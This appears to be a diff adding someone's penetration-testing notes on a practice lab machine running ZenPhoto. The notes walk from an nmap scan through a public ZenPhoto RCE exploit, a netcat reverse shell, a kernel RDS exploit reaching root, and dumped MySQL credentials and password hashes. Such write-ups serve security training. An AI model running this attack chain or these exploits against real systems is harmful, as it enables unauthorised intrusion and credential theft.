@@ -1,0 +1,82 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.164.41 > ZenPhoto.txt
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
+|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
+23/tcp   open  ipp     CUPS 1.4
+| http-methods: 
+|   Supported Methods: GET HEAD OPTIONS POST PUT
+|_  Potentially risky methods: PUT
+|_http-title: 403 Forbidden
+|_http-server-header: CUPS/1.4
+80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+gobuster and found 
+http://192.168.164.41/test/ # show ZenPhoto and a search field. View source code found zenphoto version 1.4.1.4
+
+$ searchsploit zenphoto -o
+ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution | php/webapps/18083.php
+$ searchsploit -m php/webapps/18083.php
+# Can DIRECTLY USE php to run .php scripts.
+$ php 18083.php 192.168.164.41 /test/  # remember need to type /test/ exactly.
+
+zenphoto-shell# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+run nc to get a new better shell.
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.239] from (UNKNOWN) [192.168.164.41] 42451
+/bin/sh: can't access tty; job control turned off
+$ 
+
+run linpeas.sh
+Linux version 2.6.32-21-generic Ubuntu 10.04.3 LTS
+Sudo version 1.7.2p1
+dirtycow 2
+ptrace_kmod2
+CVE: CVE-2018-14665 | Name: exploit_x | http://www.exploit-db.com/exploits/45697
+CVE: CVE-2010-3904 | Name: rds | http://www.exploit-db.com/exploits/15285 
+
+https://github.com/SecWiki/linux-kernel-exploits/tree/master/2010/CVE-2010-3904
+Get rds exploit from above link
+www-data@offsecsrv:/tmp$ ./rds
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved security_ops to 0xc08c8c2c
+ [+] Resolved default_security_ops to 0xc0773300
+ [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
+ [+] Resolved commit_creds to 0xc016dcc0
+ [+] Resolved prepare_kernel_cred to 0xc016e000
+[*] Overwriting security ops...
+[*] Overwriting function pointer...
+[*] Triggering payload...
+[*] Restoring function pointer...
+[*] Got root!
+# id
+uid=0(root) gid=0(root)
+
+##################################################################################
+# nothing found 
+$conf['mysql_user'] = 'root';           // Supply your Database user id.
+$conf['mysql_pass'] = 'hola';           // Supply your Database password.
+$conf['mysql_host'] = 'localhost';
+database zenphoto
+admin:63e5c2e178e611b692b526f8b6332317f2ff5513
+database mysql
+root:3F50515DDEE62F18A2B1CE3BE819CFB2F3C869F1:hola
+debian-sys-maint:AD62CB8DC529896A74C523CE8B1C56970267CA3D
+
+$ searchsploit sudo -o
+(Tod Miller's) Sudo/SudoEdit 1.6.9p21/1.7.2p4 - Local Privilege Escalation | multiple/local/11651.sh
+# Need user password 
+
+
+
